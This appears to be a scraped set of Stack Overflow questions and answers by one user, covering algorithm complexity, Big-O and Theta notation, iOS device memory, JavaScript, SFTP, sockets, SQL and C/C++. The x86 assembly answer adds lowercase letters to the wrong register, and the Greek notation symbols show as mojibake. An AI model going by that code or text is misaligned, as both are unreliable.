<p>As far as I know, this leads to one of the following situations:</p>

<ol>
<li>Programming is tought from its very basics. The experienced students get bored and discontinue to visit the lectures. As a consequence, they will miss even the stuff they do not already know.</li>
<li>Teachers and professors claim that they require basic knowledge (whatever that means). Inexperienced students cannot follow the lectures and a lot of them will focus on unimportant stuff (e.g. understanding every detail of a complex example while not getting the concept behind the example). Some of them will give up.</li>
<li>Universities invent an artificial programming language to give experienced programmers and newbies ""equal chances"". Most students will get frustrated about the ""useless language"".</li>
</ol>

<p>Is there a fourth solution, which is better than those above?</p>
","33708","Mehrdad","<p>I think the best way to keep it interesting is to bring up practical and interesting exercises along the theory. Taking a problem-solution approach is great (with interesting, funny, exciting, real-world problems). This requires the professor himself to have hands-on experience, work with new technologies and know them pretty well and not just teach what he had learned a couple decades ago.</p>

<p>The thing is, programming should be learned by practice. The instructor should focus on motivating students to code and try to solve problems themselves. This can be done by assigning a complete life-like project at the beginning of the course and working through the subproblems that occur in the project in the class. This way, students will have an idea why some specific feature in the programming language exists and where it might be useful.</p>

<p>Just a thought though. Not tried it! ;)</p>
"
"<p>I understand Big-O notation, but I don't know how to calculate it for many functions. In particular, I've been trying to figure out the computational complexity of the naive version of the Fibonacci sequence:</p>

<pre><code>int Fibonacci(int n)
{
    if (n &lt;= 1)
        return n;
    else
        return Fibonacci(n - 1) + Fibonacci(n - 2);
}
</code></pre>

<p>What is the computational complexity of the Fibonacci sequence and how is it calculated?</p>
","33708","Mehrdad Afshari","<p>You model the time function to calculate <code>Fib(n)</code> as sum of time to calculate <code>Fib(n-1)</code> plus the time to calculate <code>Fib(n-2)</code> plus the time to add them together (<code>O(1)</code>).</p>

<p><code>T(n&lt;=1) = O(1)</code></p>

<p><code>T(n) = T(n-1) + T(n-2) + O(1)</code></p>

<p>You solve this recurrence relation (using generating functions, for instance) and you'll end up with the answer.</p>

<p>Alternatively, you can draw the recursion tree, which will have depth <code>n</code> and intuitively figure out that this function is asymptotically <code>O(2</code><sup><code>n</code></sup><code>)</code>. You can then prove your conjecture by induction.</p>

<p>Base: <code>n = 1</code> is obvious</p>

<p>Assume <code>T(n-1) = O(2</code><sup><code>n-1</code></sup><code>)</code>, <i>therefore</i> </p>

<p><code>T(n) = T(n-1) + T(n-2) + O(1)</code> <i>which is equal to</i></p>

<p><code>T(n) = O(2</code><sup><code>n-1</code></sup><code>) + O(2</code><sup><code>n-2</code></sup><code>) + O(1) = O(2</code><sup><code>n</code></sup><code>)</code></p>

<p>However, as noted in a comment, this is not the tight bound. An interesting fact about this function is that the T(n) is asymptotically <b>the same</b> as the value of <code>Fib(n)</code> since both are defined as </p>

<p><code>f(n) = f(n-1) + f(n-2)</code>. </p>

<p>The leaves of the recursion tree will always return 1. The value of <code>Fib(n)</code> is sum of all values returned by the leaves in the recursion tree which is equal to the count of leaves. Since each leaf will take O(1) to compute, <code>T(n)</code> is equal to <code>Fib(n) x O(1)</code>. Consequently, the tight bound for this function is the Fibonacci sequence itself (~<code>Î¸(1.6</code><sup><code>n</code></sup><code>)</code>). You can find out this tight bound by using generating functions as I'd mentioned above.</p>
"
"<p>Sometimes Eclipse comes up saying ""hey you should debug this line!!!"" but doesn't actually close the program. I can then continue to play big two, and even go through the same events that caused the error the first time and get another error box to pop up!</p>

<p>The bug is simple, I'll fix it, I just want to know why some bugs are terminal and some are not? What's the difference?</p>
","33708","Mehrdad Afshari","<p>Programming mistakes can be categorized in these categories:</p>

<ol>
<li>Compile-time errors, which are caught by the compiler at the time of compilation and without correcting them, it's not possible to run the program at all.</li>
<li>Run-time errors, which are not caught by the compiler but put the computer in a situation which it cannot figure out what to do by itself, such as unhandled exceptions. Most of the times, this will cause the program to fail at run time and crash.</li>
<li>Logical errors, which are perfectly acceptable by the computer, as it is a valid computer program, but does not produce the result you expect. There is no way a computer can catch them since computer doesn't know your intention.</li>
</ol>

<p>In practice, it's a good thing to make errors be as deadly as possible as soon as they occur. It makes us find them sooner and correct them easier. This is why in ""safer"" languages such as Java, we have checked exceptions, and unhandled exceptions will cause the application to crash immediately instead of going on and probably producing incorrect results.</p>
"
"<p>Different iPhones have different published memory 4GB, 8GB and 16GB. The touch can have 32GB. My understanding is this is the off-line memory (disk alike). </p>

<p>How much actual fast ram is there in the device available for my Cocoa Application? </p>

<p>Is there a preconfigured virtual amount?</p>
","33708","Mehrdad Afshari","<h1>iPhone</h1>

<ul>
<li>iPhone (June 2007): 128MB</li>
<li>iPhone 3G (July 2008): 128MB</li>
<li>iPhone 3GS (June 2009): 256MB</li>
<li>iPhone 4 (June 2010): 512MB</li>
<li>iPhone 4S (October 2011): 512MB</li>
<li>iPhone 5 (September 2012): 1GB</li>
<li>iPhone 5S (September 2013): 1GB</li>
</ul>

<h1>iPod touch</h1>

<ul>
<li>1st generation (September 2007): 128MB</li>
<li>2nd generation (September 2008): 128MB</li>
<li>3rd generation (September 2009): 256MB</li>
<li>4th generation (September 2010): 256MB</li>
<li>5th generation (October 2012): 512MB</li>
</ul>

<h1>iPad</h1>

<ul>
<li>1st generation (April 2010): 256MB</li>
<li>iPad 2 (2011): 512MB </li>
<li>3rd generation (March 2012): 1GB</li>
<li>4th generation (November 2012): 1GB</li>
<li>iPad Air (November 2013): 1GB</li>
</ul>

<h1>iPad mini</h1>

<ul>
<li>1st generation (November 2012): 512MB</li>
<li>2nd generation (November 2013): 1GB</li>
</ul>

<p>iOS doesn't use swap space, therefore, only RAM will be available to processes. (That said, iOS does support paging executables.)</p>
"
"<p>I really don't understand what the problem is with those people who ask you not to use JavaScript on your site. </p>

<p><img src=""http://www.beholdgenealogy.com/img/no_javascript.gif"" alt=""Why the paranoia?""></p>

<p>I went through all sorts of trouble trying to remove a couple of JavaScript scripts I used on one of my sites <a href=""http://groups.google.com/group/soc.genealogy.computing/browse_thread/thread/fc76732425d5f24f"">to appease a couple of ""complainers""</a>. A month later, after a relentless attack by spam bots, I decided I better add the JavaScript spam prevention code back in.</p>

<p>JavaScript is obviously used by a lot of programmers. It is currently the 6th most popular tag here at Stack Overflow. It is used on practically every single website that I know of. </p>

<p>The claim that it is a security risk seems bogus to me. I've had JavaScript on in my browser for as long as I remember, and not once have I found out that anything malicious has happened.</p>

<p>JavaScript has, of course, been extended into AJAX. And AJAX is the thing that makes the wonderful world of Web 2.0 work. And that includes this wonderful Stack Overflow site.</p>

<p>So is there something I'm missing? Is there something wrong with JavaScript that I'm not aware of?</p>

<hr>

<p>Follow-up:</p>

<p>I am flabbergasted by the response to my Question.</p>

<p>The responses are strong and vociferous from the Anti-JavaScript people.</p>

<p>There was one pro-JavaScript comment, and it was voted down (as I write this to -2) by the others.</p>

<p>I turned JavaScript off to add this follow-up. I immediately notice three obvious things (There might be more):</p>

<ol>
<li><p>A big annoying white on red banner at the top of each page saying: ""Stack Overflow works best with JavaScript enabled"". (Annoyance) </p></li>
<li><p>Comments cannot be viewed at all or added. You can't vote up or vote down. You can't select the accepted answer. (Loss of functionality)</p></li>
<li><p>Of course none of the AJAX stuff works. I don't have access to the line of editing tools above this entry box, and I can't see the preview as I type this. (Inconveniences)</p></li>
</ol>

<p>So as far as I am concerned, turning your JavaScript off results in Annoyances, Loss of Functionality, and Inconvenience.</p>

<p>I'm sorry for the handicapped people who have no JavaScript support, but I still don't get why so many of you are so religiously against using it. </p>

<p>Personally, I love what AJAX and its beautiful interfaces and enhanced functionality are doing to the Web. I try to add such features to my site and it annoys me when the Anti-JavaScript people ask me - no, demand of me to take it out because they can't access them. </p>

<p>But how many of you use Stack Overflow with JavaScript off? None I would expect. Your answer would be that you turn it on for sites you trust like Stack Overflow.</p>

<p>Okay. If I make a site that uses Ajax or JavaScript, then I'm fine with you turning it off until you decide to trust my site. But don't expect me to be required to give you all the functionality that I do to people who trust me. Even Stack Overflow doesn't. </p>

<p>If someone wants to embellish this idea, I'll give them the accepted answer.</p>

<hr>

<p>Also see the question:  <a href=""http://stackoverflow.com/questions/337570/is-it-worth-it-to-code-different-functionality-for-users-with-javascript-disabl"">Is it worth it to code different functionality for users with JavaScript disabled?</a></p>

<p>and <a href=""http://stackoverflow.com/questions/337570/is-it-worth-it-to-code-different-functionality-for-users-with-javascript-disabl#378681"">my answer to that question</a> (which, when I last looked, had been voted down by the Do-Not-Use JavaScript people).</p>

<hr>

<p>Followup.  I found the following opinion about JavaScript at the <a href=""http://www.polepositionmarketing.com/library/wp-spamfree/#wpsf_how_it_works"">WP-SpamFree WordPress Plugin page</a>:</p>

<p>""Most of the spam hitting your blog originates from bots. Few bots can process JavaScript. Few bots can process cookies. Fewer still, can handle both. In a nutshell, this plugin uses a combo of JavaScript and cookies (on steroids) to weed out the humans from spambots, preventing 99%+ of automated spam from ever getting to your site. Almost 100% of web site visitors will have these turned on by default, so this type of solution works silently in the background, with no inconveniences. There are extremely few users (less than 2%) that have JavaScript and/or cookies turned off by default, but they will be prompted to turn those back on to post their comment.</p>

<p>Stats show that among all Internet users, less than 2% have JavaScript turned off, and less than 1% have cookies turned off. This requirement isnât anything out of the ordinary because most modern websites require the use of JavaScript and cookies for key features â AJAX, for example, wonât work if JS is disabled.</p>

<p><strong>Overall, the very few that might be inconvenienced because they have JS and cookies turned off will be far fewer than the 100% who would be annoyed by CAPTCHAâs, challenge questions, and other validation methods.</strong>""</p>
","33708","Mehrdad Afshari","<p>Some mobile browsers do not support Javascript and relying on Javascript might render them unsupported.</p>
"
"<p><strong>What in C#.NET makes it more suitable</strong> for some projects than VB.NET?</p>

<p>Performance?, Capabilities?, Libraries/Components?, Reputation?, Reliability? Maintainability?, Ease?</p>

<p><hr /></p>

<p>Basically anything <strong>C# can do, that is impossible using VB,</strong> or vice versa.
Things you just <strong>have to consider</strong> when choosing C#/VB for a project.</p>
","33708","Mehrdad Afshari","<p>In early versions of VB.NET, the difference was more obvious, however with the current version, there are no significant differences.</p>

<p>VB supports XML literals directly in code, which is not supported by C#. C# supports unsafe code and VB don't. Technically these two are the biggest differences. There are many small variations but they are not important. I like C# more because I think the syntax is much less bloated. It's easy to recognize the blocks of code instead of seeing a bunch of keywords, but that's a pure personal preference.</p>

<p>Choose the one you and your team are more familiar with.</p>
"
"<p>Now that the Christmas holidays are near, I'd like to get all your opinions on ""What would the perfect computer gift be?""</p>

<p>Some grounds rules though, it needs to be computer related and have something to do with programming. Meaning it could be a digital programmable photo frame for all I care. But, surprise me! ;)</p>

<p>Suggestions: An ARM device with a nice Programmers book of choice?</p>

<p>And Merry Christmas to you all!</p>
","33708","Mehrdad Afshari","<p>Joel suggests a pink HDMI cable!</p>

<p>I prefer a new MacBook!</p>
"
"<p>C++ does not have native support for lazy evaluation (as Haskell does).</p>

<p>I'm wondering if it is possible to implement lazy evaluation in C++ in a reasonable manner. If yes, how would you do it?</p>

<p>EDIT: I like Konrad Rudolph's answer.</p>

<p>I'm wondering if it's possible to implement it in a more generic fashion, for example by using a parametrized class lazy that essentially works for T the way matrix_add works for matrix.</p>

<p>Any operation on T would return lazy instead. The only problem is to store the arguments and operation code inside lazy itself. Can anyone see how to improve this?</p>
","33708","Mehrdad Afshari","<p>As it's going to be done in <a href=""http://en.wikipedia.org/wiki/C%2B%2B0x#Lambda_functions_and_expressions"" rel=""nofollow"">C++0x</a>, by lambda expressions.</p>
"
"<p>The more and more advanced compilers, languages, and frameworks we have that either automate tasks, or hide certain intricacies from us, do they ultimately make us dumber programmers?</p>

<p><a href=""http://stackoverflow.com/users/21706/jim-c"">Jim C</a> gives the following analogy of a calculator:</p>

<blockquote>
  <p>Any one extract a square root lately,
  by using paper and pencil? We use a
  calculator or simple call a function
  in our favorite programming language.
  How many of us know what the
  calculator does or even the function?</p>
</blockquote>

<p>So why don't we all just tell our kids to forget learning math, that's what we have calculators for? Wouldn't that inherently make our kids dumber?</p>
","33708","Mehrdad Afshari","<p>They don't make good programmers dumber, they make them more productive; but they make dumber people be able to program and think they are great programmers.</p>

<p>Clarification: I don't have a precise definition for being dumb. From dumb I mean a general thing that is people who shouldn't really be programmers or should try to learn important things. I have seen lots of people who can't really code and just copy stuff from here and there. Software quality assessment is not an easy thing. They finally build a crappy software that works somehow (due to existence of good tools) so they don't lose their jobs and they think they are good programmers and therefore, should never try to learn anything. Believe me, there is one thing I've seen in every good developer: ""They never stop learning, and they don't go to learn just the piece of code they need to complete their job."" Those people I talked about never try to learn anything beyond what they need and great tools reduce this ""need"". </p>

<p><b>This doesn't mean IDEs are bad. I love them and think they should be developed as much as possible.</b></p>
"
"<p>I have a webpage on my site that displays a table, reloads the XML source data every 10 seconds (with an XmlHttpRequest), and then updates the table to show the user any additions or removals of the data. To do this, the JavaScript function first clears out all elements from the table and then adds a new row for each unit of data.</p>

<p>Recently, I battled thru a number of memory leaks in Internet Explorer caused by this DOM destroy-and-create code (most of them having to do with circular references between JavaScript objects and DOM objects, and the JavaScript library we are using quietly keeping a reference to every JS object created with <code>new Element(...)</code> until the page is unloaded). </p>

<p>With the memory problems solved, we've now uncovered a CPU-based problem: when the user has a large amount of data to view (100+ units of data, which equals 100 <code>&lt;tr&gt;</code> nodes to create, plus all of the table cells for each column), the process ties up the CPU until Internet Explorer prompts the user with:</p>

<blockquote>
  <p>Stop running this script?<br />
  A script on this page is causing Internet Explorer to run slowly.
  If it continues to run, your computer may become
  unresponsive.</p>
</blockquote>

<p>It seems that running the row-and-cell-creation code times 100+ pieces of data is what is causing the CPU usage to spike, the function to take ""too long"" (from IE's perspective) to run, thus causing IE to generate this warning for the user. I've also noticed that while the ""update screen"" function runs for the 100 rows, IE does not re-render the table contents until the function completes (since the JS interpreter is using 100% CPU for that time period, I assume).</p>

<p>So my question is: Is there any way in JavaScript to tell the browser to pause JS execution and re-render the DOM? If not, are there any strategies for handling creating large amounts of DOM nodes and <em>not</em> having the browser choke? </p>

<p>One method I can think of would be to handle the ""update table"" logic asynchronously; that is, once the Ajax method to reload the XML data is complete, put the data into some sort of array, and then set a function (using <code>setInterval()</code>) to run which will handle one element of the array at a time. However this seems a little bit like re-creating threading in a JavaScript environment, which seems like it could get very complicated (i.e. what if another Ajax data request fires while I'm still re-creating the table's DOM nodes?, etc.)  </p>

<p><hr /></p>

<p><strong>update</strong>: Just wanted to explain why I'm accepting RoBurg's answer. In doing some testing, I've found that the <code>new Element()</code> method in my framework (I'm using <a href=""http://mootools.net/"" rel=""nofollow"">mootools</a>) is about 2x as slow as the traditional <code>document.createElement()</code> in IE7. I ran a test to create 1000 <code>&lt;spans&gt;</code> and add them to a <code>&lt;div&gt;</code>, using <code>new Element()</code> takes about 1800ms on IE7 (running on Virtual PC), the traditional method takes about 800ms.</p>

<p>My test also revealed an even quicker method, at least for a simple test such as mine: using <a href=""http://ejohn.org/blog/dom-documentfragments/"" rel=""nofollow"">DocumentFragments as described by John Resig</a>. Running the same test on the same machine with IE7 took 247ms, a <strong>9x</strong> improvement from my original method!</p>
","33708","Mehrdad Afshari","<p>You could create a string representation and add it as <code>innerHTML</code> of a node.</p>
"
"<p>I'm currently reading, <a href=""http://rads.stackoverflow.com/amzn/click/0582844428"" rel=""nofollow"">""Design Patterns:Elements of Reusable Object-Oriented Software""</a> by Erich Gamma and others. I decided to do some small projects to see the actual result of applying design patterns to the software I write.</p>

<p>How strict should I be on implementing them? I have seen some examples on the internet that implement the <a href=""http://en.wikipedia.org/wiki/Interpreter_pattern"" rel=""nofollow"">interpreter pattern</a> which just skip entire classes/interfaces/methods in the implementation. Should one be allowed to do the same or is it better to be strict about the implementation to avoid future problems, i.e. to pre-support functionality? Or are design patterns not to be seen as the answer to everything and should they be applied in a way that applies to the current situation, i.e. code specific? </p>
","33708","Mehrdad Afshari","<p>As it's been once pointed out at SO, <a href=""http://stackoverflow.com/questions/406760/whats-your-most-controversial-programming-opinion#406775"">using your brain</a> is the best way to write good software. All depends on the specific situation. </p>
"
"<p>While looking for an SFTP client in C# SSH File Transfer Protocol (SFTP), I've come across these two suitable projects - <a href=""http://sourceforge.net/projects/sharpssh"">one</a> and <a href=""http://granados.sourceforge.net/"">two</a>.</p>

<p>While trying to understand the basics, I came across this confusing <a href=""http://en.wikipedia.org/wiki/FTP_over_SSH#FTP_over_SSH_.28not_SFTP.29"">Wikipedia article</a>. What is difference between SFTP and FTP over SSH? No library seems to give support for ""FTP over SSH"", if it is different.</p>
","33708","Mehrdad Afshari","<p>FTP over SSH is plain FTP protocol tunneled through SSH. SFTP is the file transfer mechanism offered by SSH and it's a completely different protocol. I haven't seen anybody using FTP over SSH.</p>
"
"<p>I am using <code>enum</code> keyword to define set of values which I read from database tables.</p>

<p>I am not confident that these values will remain constant in the database and in <code>switch</code> <code>case</code> statement we need to give constant values. How can I solve this problem?</p>
","33708","Mehrdad Afshari","<p>If the values are not supposed to be constant they should reside in a database table and you should use a join to retrieve the actual value.</p>
"
"<p>assume that i have a program written in assembly language which takes an input sentence from the user ( combination of digits and letters) and on the next line will display the number of small letters in the sentence. Also display the number of digits in the sentence.</p>

<p>my question is:  how i can make the count instruction to count the numbers and the letters ? </p>
","33708","Mehrdad Afshari","<p>I assume you mean x86 assembly and the string is null terminated.</p>

<pre><code>mov eax, STRING_VARIABLE
xor ebx, ebx
xor ecx, ecx
.loop:
  mov dl, [eax]
  cmp dl, 0
  jz .end

  cmp dl, '0'
  jb .notdigit
  cmp dl, '9'
  ja .notdigit
  inc ecx
  jmp .notlowercase
  .notdigit:
  cmp dl, 'a'
  jb .notlowercase
  cmp dl, 'z'
  ja .notlowercase
  inc ecx
  .notlowercase:

  inc eax
  jmp .loop
.end:
; ebx contains the lowercase letter count
; ecx contains the digit count
</code></pre>
"
"<p>Sometimes I see Î(n) with the strange Î symbol with something in the middle of it, and sometimes just O(n). Is it just laziness of typing because nobody knows how to type this symbol, or does it mean something different?</p>
","33708","Mehrdad Afshari","<h3>Short explanation:</h3>

<blockquote>
  <p>If an algorithm is of Î(g(n)), it means that the running time of the algorithm as n (input size) gets larger is proportional to g(n).</p>
  
  <p>If an algorithm is of O(g(n)), it means that the running time of the algorithm as n gets larger is <b>at most</b> proportional to g(n).</p>
</blockquote>

<p>Normally, even when people talk about O(g(n)) they actually mean Î(g(n)) but technically, there is a difference. </p>

<hr />

<h3>More technically:</h3>

<p>O(n) represents upper bound. Î(n) means tight bound.
Î©(n) represents lower bound.</p>

<blockquote>
  <blockquote>
    <p>f(x) = Î(g(x)) iff f(x) =
    O(g(x)) and f(x) = Î©(g(x))</p>
  </blockquote>
</blockquote>

<p>For example, <em>an</em> upper bound for the naive recursive approach to compute Fibonacci sequence is:</p>

<blockquote>
  <p>Fib(x) = O(2<sup>n</sup>)</p>
</blockquote>

<p>but the tight bound is </p>

<blockquote>
  <p>Fib(x) = Î(F<sub>n</sub>) where F<sub>n</sub> is the Fibonacci sequence.</p>
</blockquote>

<p>which is also a valid upper bound.</p>

<p>Basically when we say an algorithm is of O(n), it's also O(n<sup>2</sup>), O(n<sup>1000000</sup>), O(2<sup>n</sup>), ... but a Î(n) algorithm is <strong>not</strong> Î(n<sup>2</sup>).</p>

<p>In fact, since f(n) = Î(g(n)) means for sufficiently large values of n, f(n) can be bound within c<sub>1</sub>g(n) and c<sub>2</sub>g(n) for some values of c<sub>1</sub> and c<sub>2</sub>, i.e. the growth rate of f is asymptotically equal to g: g can be a lower bound <strong>and</strong> and an upper bound of f. This directly implies f can be a lower bound and an upper bound of g as well. Consequently,</p>

<blockquote>
  <p>f(x) = Î(g(x)) iff g(x) = Î(f(x))</p>
</blockquote>

<p>Similarly, to show f(n) = Î(g(n)), it's enough to show g is an upper bound of f (i.e. f(n) = O(g(n))) and f is a lower bound of g (i.e. f(n) = Î©(g(n)) which is the exact same thing as g(n) = O(f(n))). Concisely,</p>

<blockquote>
  <p>f(x) = Î(g(x)) iff f(x) = O(g(x)) and g(x) = O(f(x))</p>
</blockquote>

<hr>

<p>There are also small-oh and small-omega (<code>Ï</code>) notations representing loose upper and loose lower bounds of a function. </p>

<p>To summarize:</p>

<blockquote>
  <p><code>f(x) = O(g(x))</code> (big-oh) means that
  the growth rate of <code>f(x)</code> is
  asymptotically <b>less than or equal
  to</b> to the growth rate of <code>g(x)</code>.</p>
  
  <p><code>f(x) = Î©(g(x))</code> (big-omega) means
  that the growth rate of <code>f(x)</code> is
  asymptotically <b>greater than or
  equal to</b> the growth rate of <code>g(x)</code></p>
  
  <p><code>f(x) = o(g(x))</code> (small-oh) means that
  the growth rate of <code>f(x)</code> is
  asymptotically <b>less than</b> the
  growth rate of <code>g(x)</code>.</p>
  
  <p><code>f(x) = Ï(g(x))</code> (small-omega) means
  that the growth rate of <code>f(x)</code> is
  asymptotically <b>greater than</b> the
  growth rate of <code>g(x)</code></p>
  
  <p><code>f(x) = Î(g(x))</code> (theta) means that
  the growth rate of <code>f(x)</code> is
  asymptotically <b>equal to</b> the
  growth rate of <code>g(x)</code></p>
</blockquote>

<p>For a more detailed discussion, you can <a href=""http://en.wikipedia.org/wiki/Big_O_notation"" rel=""nofollow"">read the definition on Wikipedia</a> or consult a classic textbook like Introduction to Algorithms by Cormen et al.</p>
"
"<p>I'm trying to replace this:</p>

<pre><code>void ProcessRequest(object listenerContext)
{
    var context = (HttpListenerContext)listenerContext;
    Uri URL = new Uri(context.Request.RawUrl);
    HttpWebRequest.DefaultWebProxy = null;
    HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(URL);
    httpWebRequest.Method = context.Request.HttpMethod;
    httpWebRequest.Headers.Clear();
    if (context.Request.UserAgent != null) httpWebRequest.UserAgent = context.Request.UserAgent;
    foreach (string headerKey in context.Request.Headers.AllKeys)
    {
        try { httpWebRequest.Headers.Set(headerKey, context.Request.Headers[headerKey]); }
            catch (Exception) { }
    }

    using (HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse())
    {
        Stream responseStream = httpWebResponse.GetResponseStream();
        if (httpWebResponse.ContentEncoding.ToLower().Contains(""gzip""))
            responseStream = new GZipStream(responseStream, CompressionMode.Decompress);
        else if (httpWebResponse.ContentEncoding.ToLower().Contains(""deflate""))
                responseStream = new DeflateStream(responseStream, CompressionMode.Decompress);

        MemoryStream memStream = new MemoryStream();

        byte[] respBuffer = new byte[4096];
        try
        {
            int bytesRead = responseStream.Read(respBuffer, 0, respBuffer.Length);
            while (bytesRead &gt; 0)
            {
                memStream.Write(respBuffer, 0, bytesRead);
                bytesRead = responseStream.Read(respBuffer, 0, respBuffer.Length);
            }
        }
        finally
        {
            responseStream.Close();
        }

        byte[] msg = memStream.ToArray();

        context.Response.ContentLength64 = msg.Length;
        using (Stream strOut = context.Response.OutputStream)
        {
            strOut.Write(msg, 0, msg.Length);
        }
    }
    catch (Exception ex)
    {
        // Some error handling
    }
}
</code></pre>

<p>with sockets. This is what I have so far:</p>

<pre><code>void ProcessRequest(object listenerContext)
{
    HttpListenerContext context = (HttpListenerContext)listenerContext;
    Uri URL = new Uri(context.Request.RawUrl);
    string getString = string.Format(""GET {0} HTTP/1.1\r\nHost: {1}\r\nAccept-Encoding: gzip\r\n\r\n"",
                context.Request.Url.PathAndQuery,
                context.Request.UserHostName);

    Socket socket = null;

    string[] hostAndPort;
    if (context.Request.UserHostName.Contains("":""))
    {
        hostAndPort = context.Request.UserHostName.Split(':');
    }
    else
    {
        hostAndPort = new string[] { context.Request.UserHostName, ""80"" };
    }

    IPHostEntry ipAddress = Dns.GetHostEntry(hostAndPort[0]);
    IPEndPoint ip = new IPEndPoint(IPAddress.Parse(ipAddress.AddressList[0].ToString()), int.Parse(hostAndPort[1]));
    socket = new Socket(ip.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
    socket.Connect(ip);
</code></pre>

<p><strong>BEGIN NEW CODE</strong></p>

<pre><code>Encoding ASCII = Encoding.ASCII;
Byte[] byteGetString = ASCII.GetBytes(getString);
Byte[] receiveByte = new Byte[256];
string response = string.Empty;
socket.Send(byteGetString, byteGetString.Length, 0);
Int32 bytes = socket.Receive(receiveByte, receiveByte.Length, 0);
response += ASCII.GetString(receiveByte, 0, bytes);
while (bytes &gt; 0)
{
bytes = socket.Receive(receiveByte, receiveByte.Length, 0);
strPage = strPage + ASCII.GetString(receiveByte, 0, bytes);
}
socket.Close();

string separator = ""\r\n\r\n"";
string header = strPage.Substring(0,strPage.IndexOf(separator));
string content = strPage.Remove(0, strPage.IndexOf(separator) + 4);

byte[] byteResponse = ASCII.GetBytes(content);
context.Response.ContentLength64 = byteResponse .Length;
context.Response.OutputStream.Write(byteResponse , 0, byteResponse .Length);
context.Response.OutputStream.Close();
</code></pre>

<p><strong>END NEW CODE</strong></p>

<p>After connecting to the socket I don't know how to get the Stream response to decompress, and send back to <strong>context.Response.OutputStream</strong></p>

<p>Any help will be appreciated.
Thanks.
Cheers.</p>

<p><strong>EDIT 2:</strong>
With this edit now seems to be working fine (same as HttpWebRequest at least). Do you find any error here?</p>

<p><strong>EDIT 3:</strong>
False alarm... Still can't get this working</p>

<p><strong>EDIT 4:</strong>
I needed to add the following lines to Scott's code ... because not always the first to bytes of reponseStream are the gzip magic number.
The sequence seems to be: 0x0a (10), 0x1f (31), 0x8b (139). The last two are the gzip magic number. The first number was always before in my tests.</p>

<pre><code>if (contentEncoding.Equals(""gzip""))
{
    int magicNumber = 0;
    while (magicNumber != 10)
        magicNumber = responseStream.ReadByte();
    responseStream = new GZipStream(responseStream, CompressionMode.Decompress);
}
</code></pre>
","33708","Mehrdad Afshari","<p>Socket, by definition, is the low level to access the network. You can even use datagram protocols with a socket. In that case a stream does not make sense at all.</p>

<p>While I'm not sure why are you doing what HttpWebRequest easily accomplishes, to read/write data to a socket, you use the Send/Receive methods. If you want to have a stream like access to a TCP socket, you should use the TcpClient/TcpListener classes which wrap a socket and provide a network stream for it.</p>
"
"<p>One of the stated reasons for knowing assembler is that, on occasion, it can be employed to write code that will be more performant than writing that code in a higher-level language, C in particular.  However, I've also heard it stated many times that although that's not entirely false, the cases where assembler can <strong>actually</strong> be used to generate more performant code are both extremely rare and require expert knowledge of and experience with assembler.  </p>

<p>This question doesn't even get into the fact that assembler instructions will be machine-specific and non-portable, or any of the other aspects of assembler.  There are plenty of good reasons for knowing assembler besides this one, of course, but this is meant to be a specific question soliciting examples and data, not an extended discourse on assembler versus higher-level languages.</p>

<p>Can anyone provide some <strong>specific examples</strong> of cases where assembler will be faster than well-written C code using a modern compiler, and can you support that claim with profiling evidence?  I am pretty confident these cases exist, but I really want to know exactly how esoteric these cases are, since it seems to be a point of some contention.</p>
","33708","Mehrdad Afshari","<p>Matrix operations using SIMD instructions is probably faster than compiler generated code.</p>
"
"<p>Please clear my doubt about this, In SQL Server (2000 and above) is primary key automatically cluster indexed or do we have choice to have non-clustered index on primary key? </p>
","33708","Mehrdad Afshari","<p>Nope, it can be nonclustered. However, if you don't explicitly define it as nonclustered and there is no clustered index on the table, it'll be created as clustered.</p>
"
"<p>If I have a table</p>

<pre><code>CREATE TABLE users (
  id int(10) unsigned NOT NULL auto_increment,
  name varchar(255) NOT NULL,
  profession varchar(255) NOT NULL,
  employer varchar(255) NOT NULL,
  PRIMARY KEY  (id)
)
</code></pre>

<p>and I want to get all unique values of <code>profession</code> field, what would be faster (or recommended):</p>

<pre><code>SELECT DISTINCT u.profession FROM users u
</code></pre>

<p>or</p>

<pre><code>SELECT u.profession FROM users u GROUP BY u.profession
</code></pre>

<p>?</p>
","33708","Mehrdad Afshari","<p>I think MySQL is smart enough to do the same for both of them.</p>
"
"<p>This is totally an opinion question.  More for chatter. 
I'm taking some c++ tests and they are littered with cin and cout's.<br />
Do people acutally still use these.  I mean I've not seen one in an actual public application ever.  </p>

<p>The last question I answered in a test was</p>

<pre><code>int c1;
cout &lt;&lt; ""Enter numbers: "" &lt;&lt; flush;
for(int n = 0; cin &gt;&gt; c1; ++n){
   cout &lt;&lt; c1 &lt;&lt; endl;
}
When does this end..
</code></pre>

<p>The correct answer was ""when a user hits ctrl+Z"".   Where in the heck would I press control+Z? I'm assuming in the terminal, I suppose.  But honestly.  I've not seen the terminal for ages and ages.  And I'm sure as heck not going to attempt to program anything for it. </p>

<p>Are questions like this still relevant, in any of our lives?</p>
","33708","Mehrdad Afshari","<p>Yes, you might want to process or transform an input text file. It'll prove handy.</p>
"
"<p>In C can a function expose memory that it ""manageds"" at a lower level as readonly to those calling that function (exposing its address). <code>return * const</code> is not effective but I wondered if I was overlooking a programming tick?</p>

<p>Thanks.</p>

<pre><code>const uint8_t * get_value(int index) 
{
static uint8_t data[2] = {0, 0};
return (const uint8_t *)&amp;data[index];
}

int main(void)
{
uint8_t * value;
value = get_value(1);

*value += 1;
return 0;
}
</code></pre>

<blockquote>
  <p><strong>@j_random_hacker</strong> Suggested a good compromise to my question that gives that extra barrier I'm looking for to prevent casual mis-use of that data.</p>
</blockquote>

<pre><code>typedef struct
{
    const uint8_t * value;
    const uint8_t size;

} readonly_t;

readonly_t get_value(int index, int size) 
{
    static uint8_t data[2] = {0, 0};
    uint8_t rsize;

    /* ... validate index, size params */

    readonly_t r = { &amp;data[index], rsize };
    return r;
}
</code></pre>
","33708","Mehrdad Afshari","<p>It's C! You can't :) There is always a way to circumvent it. Just make it <code>const</code> and hope somebody will not change it.</p>

<p>If you are hosting an add-in or something, you should run it in a separate process to limit its access to memory.</p>
"
"<pre><code>#include&lt;iostream.h&gt;
void main()
{
    cout&lt;&lt;""Love"";
}
</code></pre>

<p>The question is how can we change the output of this program into 
""I Love You"" without making any change in <code>main()</code>.</p>
","33708","Mehrdad Afshari","<p>Like this:</p>

<pre><code>#include &lt;iostream&gt;
int main() {
   std::cout &lt;&lt; ""I Love You"" &lt;&lt; std::endl;
   return 0;
}

/*
#include&lt;iostream.h&gt;
void main()
{
    cout&lt;&lt;""Love"";
}
*/
</code></pre>

